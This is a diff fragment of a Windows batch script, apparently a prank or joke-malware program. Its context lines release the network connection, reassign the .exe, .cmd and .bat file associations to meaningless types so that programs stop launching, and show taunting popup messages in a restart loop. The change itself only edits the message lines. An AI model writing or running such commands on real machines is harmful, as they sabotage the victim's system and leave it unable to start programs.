@@ -235,6 +235,6 @@ ipconfig /release
 assoc .exe=jaydumb
 assoc .cmd=windfufBest
 assoc .bat=CmdV5
-msg "%Dartz%" oops your PC ran into a problem
-msg "%Dartz%" uh oh you dont have fonts anymore
+msg "Dartz" oops your PC ran into a problem
+msg "Dartz" uh oh you dont have fonts anymore
 goto RESTART
